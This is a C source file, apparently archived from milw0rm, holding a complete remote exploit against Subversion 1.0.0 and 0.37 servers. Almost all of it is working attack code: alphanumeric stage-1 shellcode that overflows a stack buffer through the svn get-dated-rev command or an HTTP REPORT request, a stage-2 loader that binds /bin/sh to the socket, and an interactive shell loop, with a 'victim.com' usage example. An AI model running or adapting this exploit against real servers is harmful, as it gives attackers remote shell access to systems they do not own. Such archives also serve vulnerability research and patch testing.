/*****************************************************************
 * hoagie_subversion.c
 *
 * Remote exploit against Subversion-Servers.
 *
 * Author: greuff <greuff@void.at>
 *
 * Tested on Subversion 1.0.0 and 0.37
 *
 * Algorithm:
 * This is a two-stage exploit. The first stage overflows a buffer
 * on the stack and leaves us ~60 bytes of machine code to be
 * executed. We try to find the socket-fd there and then do a 
 * read(2) on the socket. The exploit then sends the second stage
 * loader to the server, which can be of any length (up to the
 * obvious limits, of course). This second stage loader spawns 
 * /bin/sh on the server and connects it to the socket-fd.
 *
 * Credits:
 *    void.at
 *
 * THIS FILE IS FOR STUDYING PURPOSES ONLY AND A PROOF-OF-CONCEPT.
 * THE AUTHOR CAN NOT BE HELD RESPONSIBLE FOR ANY DAMAGE OR
 * CRIMINAL ACTIVITIES DONE USING THIS PROGRAM.
 *
 *****************************************************************/

#include <sys/socket.h>
#include <sys/types.h>
#include <sys/time.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <fcntl.h>
#include <netdb.h>

enum protocol { SVN, SVNSSH, HTTP, HTTPS };

char stage1loader[]=
             // begin socket fd search
             "\x31\xdb"            // xor %ebx, %ebx
             "\x90"                // nop (UTF-8)
             "\x53"                // push %ebx
             "\x58"                // pop %eax
             "\x50"                // push %eax
             "\x5f"                // pop %edi                # %eax = %ebx = %edi = 0
             "\x2c\x40"            // sub $0x40, %al
             "\x50"                // push %eax
             "\x5b"                // pop %ebx
             "\x50"                // push %eax
             "\x5a"                // pop %edx                # %ebx = %edx = 0xC0
             "\x57"                // push %edi
             "\x57"                // push %edi               # safety-0
             "\x54"                // push %esp
             "\x59"                // pop %ecx                # %ecx = pointer to the buffer
             "\x4b"                // dec %ebx                # beginloop:
             "\x57"                // push %edi
             "\x58"                // pop %eax                # clear %eax
             "\xd6"                // salc (UTF-8)
             "\xb0\x60"            // movb $0x60, %al
             "\x2c\x44"            // sub $0x44, %al          # %eax = 0x1C
             "\xcd\x80"            // int $0x80               # fstat(i, &stat)
             "\x58"                // pop %eax
             "\x58"                // pop %eax
             "\x50"                // push %eax
             "\x50"                // push %eax
             "\x38\xd4"            // cmp %dl, %ah            # uppermost 2 bits of st_mode set?
             "\x90"                // nop (UTF-8)
             "\x72\xed"            // jb beginloop
             "\x90"                // nop (UTF-8)
             "\x90"                // nop (UTF-8)             # %ebx now contains the socket fd
             // begin read(2)
             "\x57"                // push %edi
             "\x58"                // pop %eax                # zero %eax
             "\x40"                // inc %eax
             "\x40"                // inc %eax
             "\x40"                // inc %eax                # %eax=3
             //"\x54"                // push %esp
             //"\x59"                // pop %ecx                # %ecx ... address of buffer
             //"\x54"                // push %edi
             //"\x5a"                // pop %edx                # %edx ... bufferlen (0xC0)
             "\xcd\x80"            // int $0x80               # read(2) second stage loader
             "\x39\xc7"            // cmp %eax, %edi
             "\x90"                // nop (UTF-8)
             "\x7f\xf3"            // jg startover
             "\x90"                // nop (UTF-8)
             "\x90"                // nop (UTF-8)
             "\x90"                // nop (UTF-8)
             "\x54"                // push %esp
             "\xc3"                // ret                     # execute second stage loader
             "\x90"                // nop (UTF-8)
             "\0"    // %ebx still contains the fd we can use in the 2nd stage loader.
             ;

char stage2loader[]=
             // dup2 - %ebx contains the fd
             "\xb8\x3f\x00\x00\x00"   // mov $0x3F, %eax
             "\xb9\x00\x00\x00\x00"   // mov $0x0, %ecx
             "\xcd\x80"               // int $0x80
             "\xb8\x3f\x00\x00\x00"   // mov $0x3F, %eax
             "\xb9\x01\x00\x00\x00"   // mov $0x1, %ecx
             "\xcd\x80"               // int $0x80
             "\xb8\x3f\x00\x00\x00"   // mov $0x3F, %eax
             "\xb9\x02\x00\x00\x00"   // mov $0x2, %ecx
             "\xcd\x80"               // int $0x80
             // start /bin/sh
             "\x31\xd2"               // xor %edx, %edx
             "\x52"                   // push %edx
             "\x68\x6e\x2f\x73\x68"   // push $0x68732f6e
             "\x68\x2f\x2f\x62\x69"   // push $0x69622f2f
             "\x89\xe3"               // mov %esp, %ebx
             "\x52"                   // push %edx
             "\x53"                   // push %ebx
             "\x89\xe1"               // mov %esp, %ecx
             "\xb8\x0b\x00\x00\x00"   // mov $0xb, %eax
             "\xcd\x80"               // int $0x80
             "\xb8\x01\x00\x00\x00"   // mov $0x1, %eax
             "\xcd\x80"               // int %0x80     (exit)
             ;

int stage2loaderlen=69;
             
char requestfmt[]=
"REPORT %s HTTP/1.1\n"
"Host: %s\n"
"User-Agent: SVN/0.37.0 (r8509) neon/0.24.4\n"
"Content-Length: %d\n"
"Content-Type: text/xml\n"
"Connection: close\n\n"
"%s\n";

char xmlreqfmt[]=
"<?xml version=\"1.0\" encoding=\"utf-8\"?>"
"<S:dated-rev-report xmlns:S=\"svn:\" xmlns:D=\"DAV:\">"
"<D:creationdate>%s%c%c%c%c</D:creationdate>"
"</S:dated-rev-report>";

int parse_uri(char *uri,enum protocol *proto,char host[1000],int *port,char repos[1000])
{
   char *ptr;
   char bfr[1000];
   
   ptr=strstr(uri,"://");
   if(!ptr) return -1;
   *ptr=0;
   snprintf(bfr,sizeof(bfr),"%s",uri);
   if(!strcmp(bfr,"http"))
      *proto=HTTP, *port=80;
   else if(!strcmp(bfr,"svn"))
      *proto=SVN, *port=3690;
   else
   {
      printf("Unsupported protocol %s\n",bfr);
      return -1;
   }
   uri=ptr+3;
   if((ptr=strchr(uri,':')))
   {
      *ptr=0;
      snprintf(host,1000,"%s",uri);
      uri=ptr+1;
      if((ptr=strchr(uri,'/'))==NULL) return -1;
      *ptr=0;
      snprintf(bfr,1000,"%s",uri);
      *port=(int)strtol(bfr,NULL,10);
      *ptr='/';
      uri=ptr;
   }
   else if((ptr=strchr(uri,'/')))
   {
      *ptr=0;
      snprintf(host,1000,"%s",uri);
      *ptr='/';
      uri=ptr;
   }
   snprintf(repos,1000,"%s",uri);
   return 0;
}

int exec_sh(int sockfd)
{
   char snd[4096],rcv[4096];
   fd_set rset;
   while(1)
   {
      FD_ZERO(&rset);
      FD_SET(fileno(stdin),&rset);
      FD_SET(sockfd,&rset);
      select(255,&rset,NULL,NULL,NULL);
      if(FD_ISSET(fileno(stdin),&rset))
      {
         memset(snd,0,sizeof(snd));
         fgets(snd,sizeof(snd),stdin);
         write(sockfd,snd,strlen(snd));
      }
      if(FD_ISSET(sockfd,&rset))
      {
         memset(rcv,0,sizeof(rcv));
         if(read(sockfd,rcv,sizeof(rcv))<=0)
            exit(0);
         fputs(rcv,stdout);
      }
   }
}

int main(int argc, char **argv)
{
   int sock, port;
   size_t size;
   char cmd[1000], reply[1000], buffer[1000];
   char svdcmdline[1000];
   char host[1000], repos[1000], *ptr, *caddr;
   unsigned long addr;
   struct sockaddr_in sin;
   struct hostent *he;
   enum protocol proto;

   /*sock=open("output",O_CREAT|O_TRUNC|O_RDWR,0666);
   write(sock,stage1loader,strlen(stage1loader));
   close(sock);
   return 0;*/

   printf("hoagie_subversion - remote exploit against subversion servers\n"
          "by greuff@void.at\n\n");
   if(argc!=3)
   {
      printf("Usage: %s serverurl offset\n\n",argv[0]);
      printf("Examples:\n"
             "   %s svn://localhost/repository 0x41414141\n"
             "   %s http://victim.com:6666/svn 0x40414336\n\n",argv[0],argv[0]);
      printf("The offset is an alphanumeric address (or UTF-8 to be\n"
             "more precise) of a pop instruction, followed by a ret.\n"
             "Brute force when in doubt.\n\n");
      printf("When exploiting against an svn://-url, you can supply a\n"
             "binary offset too.\n\n");
      exit(1);
   }

   // parse the URI
   snprintf(svdcmdline,sizeof(svdcmdline),"%s",argv[1]);
   if(parse_uri(argv[1],&proto,host,&port,repos)<0)
   {
      printf("URI parse error\n");
      exit(1);
   }
   printf("parse_uri result:\n"
          "Protocol: %d\n"
          "Host: %s\n"
          "Port: %d\n"
          "Repository: %s\n\n",proto,host,port,repos);
   addr=strtoul(argv[2],NULL,16);
   caddr=(char *)&addr;
   printf("Using offset 0x%02x%02x%02x%02x\n",caddr[3],caddr[2],caddr[1],caddr[0]);

   sock=socket(AF_INET,SOCK_STREAM,0);
   if(sock<0)
   {
      perror("socket");
      return -1;
   }

   he=gethostbyname(host);
   if(he==NULL)
   {
      herror("gethostbyname");
      return -1;
   }
   sin.sin_family=AF_INET;
   sin.sin_port=htons(port);
   memcpy(&sin.sin_addr.s_addr,he->h_addr,sizeof(he->h_addr));
   if(connect(sock,(struct sockaddr *)&sin,sizeof(sin))<0)
   {
      perror("connect");
      return -1;
   }

   if(proto==SVN)
   {
      size=read(sock,reply,sizeof(reply));
      reply[size]=0;
      printf("Server said: %s\n",reply);
      snprintf(cmd,sizeof(cmd),"( 2 ( edit-pipeline ) %d:%s ) ",strlen(svdcmdline),svdcmdline);
      write(sock,cmd,strlen(cmd));
      size=read(sock,reply,sizeof(reply));
      reply[size]=0;
      printf("Server said: %s\n",reply);
      strcpy(cmd,"( ANONYMOUS ( 0: ) ) ");
      write(sock,cmd,strlen(cmd));
      size=read(sock,reply,sizeof(reply));
      reply[size]=0;
      printf("Server said: %s\n",reply);
      snprintf(cmd,sizeof(cmd),"( get-dated-rev ( %d:%s%c%c%c%c ) ) ",strlen(stage1loader)+4,stage1loader,
            caddr[0],caddr[1],caddr[2],caddr[3]);
      write(sock,cmd,strlen(cmd));
      size=read(sock,reply,sizeof(reply));
      reply[size]=0;
      printf("Server said: %s\n",reply); 
   }
   else if(proto==HTTP)
   {
      // preparing the request...
      snprintf(buffer,sizeof(buffer),xmlreqfmt,stage1loader,
            caddr[0],caddr[1],caddr[2],caddr[3]);
      size=strlen(buffer);
      snprintf(cmd,sizeof(cmd),requestfmt,repos,host,size,buffer);

      // now sending the request, immediately followed by the 2nd stage loader
      printf("Sending:\n%s",cmd);
      write(sock,cmd,strlen(cmd));
      sleep(1);
      write(sock,stage2loader,stage2loaderlen);
   }

   // SHELL LOOP
   printf("Entering shell loop...\n");
   exec_sh(sock);

   /*sleep(1);
   close(sock);
   printf("\nConnecting to the shell...\n");
   exec_sh(connect_sh()); */
   return 0;
}

// milw0rm.com [2005-05-03]
